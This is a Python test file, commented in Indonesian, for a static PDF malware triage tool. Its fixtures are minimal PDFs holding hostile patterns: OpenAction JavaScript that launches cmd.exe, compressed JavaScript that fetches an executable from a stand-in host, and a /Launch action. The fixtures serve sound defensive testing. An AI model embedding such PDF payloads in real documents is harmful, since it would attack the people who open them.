"""test_pdf_triage — triase statis PDF (#0212), nol jaringan."""
from __future__ import annotations

import json
import subprocess
import sys
import zlib
from pathlib import Path

TOOLS = Path(__file__).resolve().parents[1] / "tools"
sys.path.insert(0, str(TOOLS))

import pdf_triage  # noqa: E402


def _run(path: Path, *extra: str) -> tuple[int, dict | None]:
    proc = subprocess.run(
        [sys.executable, str(TOOLS / "pdf_triage.py"), "--pdf", str(path),
         *extra], capture_output=True, text=True)
    out = json.loads(proc.stdout) if proc.stdout.strip() else None
    return proc.returncode, out


def _flate(body: bytes) -> bytes:
    return b"stream\n" + zlib.compress(body) + b"\nendstream"


def test_benign_pdf_clean(tmp_path):
    p = tmp_path / "benign.pdf"
    p.write_bytes(
        b"%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n"
        b"2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n"
        b"3 0 obj<</Type/Page/Parent 2 0 R>>endobj\n%%EOF\n")
    rc, out = _run(p)
    assert rc == 0 and out["verdict"] == "CLEAN"
    assert out["objects"] == 3 and out["has_eof"]


def test_openaction_js_malicious(tmp_path):
    p = tmp_path / "evil.pdf"
    p.write_bytes(
        b"%PDF-1.7\n1 0 obj<</Type/Catalog/OpenAction 2 0 R>>endobj\n"
        b"2 0 obj<</S/JavaScript/JS(app.launchURL\\(\"cmd.exe\"\\);)>>endobj\n"
        b"%%EOF\n")
    rc, out = _run(p)
    assert out["verdict"] == "MALICIOUS-LIKELY"
    combos = [f for f in out["findings"]
              if f["id"] == "pdf.critical-combo"]
    assert combos and "OpenAction" in combos[0]["detail"]
    assert rc == 1  # default fail-on MALICIOUS-LIKELY


def test_js_in_flate_stream_detected(tmp_path):
    body = (b"<</S/JavaScript/JS(this.getURL('http://x.example/a.exe'))>>")
    p = tmp_path / "flate.pdf"
    p.write_bytes(
        b"%PDF-1.4\n1 0 obj<</Filter/FlateDecode/Length " +
        str(len(_flate(body))).encode() + b">>\n" + _flate(body) +
        b"\nendobj\n%%EOF\n")
    rc, out = _run(p)
    ids = {f["id"] for f in out["findings"]}
    assert "pdf.js-in-stream" in ids
    counts = out["keyword_counts"]
    assert counts["/JavaScript"] == 1
    assert out["verdict"] in ("SUSPICIOUS", "MALICIOUS-LIKELY")


def test_launch_critical_combo(tmp_path):
    p = tmp_path / "launch.pdf"
    p.write_bytes(
        b"%PDF-1.4\n1 0 obj<</S/Launch/F(cmd.exe)>>endobj\n%%EOF\n")
    rc, out = _run(p)
    assert out["verdict"] == "MALICIOUS-LIKELY"


def test_single_uri_medium_inconclusive(tmp_path):
    """Satu /URI (medium) saja = tak cukup bukti -> INCONCLUSIVE."""
    p = tmp_path / "uri.pdf"
    p.write_bytes(
        b"%PDF-1.4\n1 0 obj<</A<</S/URI(link.pdf)>>/Type/Action>>endobj\n"
        b"%%EOF\n")
    rc, out = _run(p)
    assert out["verdict"] == "INCONCLUSIVE"
    assert rc == 0


def test_two_high_suspicious(tmp_path):
    p = tmp_path / "dua.pdf"
    p.write_bytes(
        b"%PDF-1.4\n1 0 obj<</JavaScript 2 0 R/EmbeddedFile 3 0 R>>endobj\n"
        b"%%EOF\n")
    rc, out = _run(p)
    assert out["verdict"] == "SUSPICIOUS"
    proc = subprocess.run(
        [sys.executable, str(TOOLS / "pdf_triage.py"), "--pdf", str(p),
         "--fail-on", "SUSPICIOUS"], capture_output=True, text=True)
    assert proc.returncode == 1  # gate


def test_encrypted_inconclusive(tmp_path):
    p = tmp_path / "enc.pdf"
    p.write_bytes(
        b"%PDF-1.4\n1 0 obj<</Filter/Standard/Encrypt 9 0 R>>endobj\n"
        b"%%EOF\n")
    rc, out = _run(p)
    assert out["verdict"] == "INCONCLUSIVE" and out["encrypted"] is True


def test_bad_header_inconclusive(tmp_path):
    """Marker %PDF ada (bukan bukan-PDF) tapi bukan di offset 0."""
    p = tmp_path / "rusak.pdf"
    p.write_bytes(b"junkjunk\n%PDF-1.4\n1 0 obj<</Type/Catalog>>endobj\n%%EOF\n")
    rc, out = _run(p)
    assert rc == 0 and out["verdict"] == "INCONCLUSIVE"
    assert out["header_ok"] is False


def test_not_pdf_exit2(tmp_path):
    p = tmp_path / "bukan.pdf"
    p.write_bytes(b"\x89PNG\r\n\x1a\n bukan pdf")
    proc = subprocess.run(
        [sys.executable, str(TOOLS / "pdf_triage.py"), "--pdf", str(p)],
        capture_output=True, text=True)
    assert proc.returncode == 2


def test_missing_file_exit2(tmp_path):
    proc = subprocess.run(
        [sys.executable, str(TOOLS / "pdf_triage.py"),
         "--pdf", str(tmp_path / "tiada.pdf")],
        capture_output=True, text=True)
    assert proc.returncode == 2


def test_out_file_read_only(tmp_path):
    p = tmp_path / "b.pdf"
    p.write_bytes(b"%PDF-1.4\n%%EOF\n")
    before = p.read_bytes()
    rc, out = _run(p, "--out", str(tmp_path / "o.json"))
    assert rc == 0 and p.read_bytes() == before
    assert (tmp_path / "o.json").is_file()
    saved = json.loads((tmp_path / "o.json").read_text(encoding="utf-8"))
    assert saved["schema"] == "secai.pdf-triage/1"


def test_jbig2decode_high(tmp_path):
    p = tmp_path / "jbig2.pdf"
    p.write_bytes(
        b"%PDF-1.4\n1 0 obj<</Filter/JBIG2Decode>>endobj\n%%EOF\n")
    rc, out = _run(p)
    # JBIG2Decode = high tunggal -> SUSPICIOUS
    assert out["verdict"] == "SUSPICIOUS"


def test_flate_garbage_never_clean(tmp_path):
    """Stream flate korup = isi tak diperiksa -> jangan CLEAN."""
    p = tmp_path / "korup.pdf"
    p.write_bytes(
        b"%PDF-1.4\n1 0 obj<</Filter/FlateDecode/Length 10>>stream\n"
        b"\x99\x88\x77garbage\nendstream endobj\n%%EOF\n")
    rc, out = _run(p)
    assert out["verdict"] in ("INCONCLUSIVE", "SUSPICIOUS")
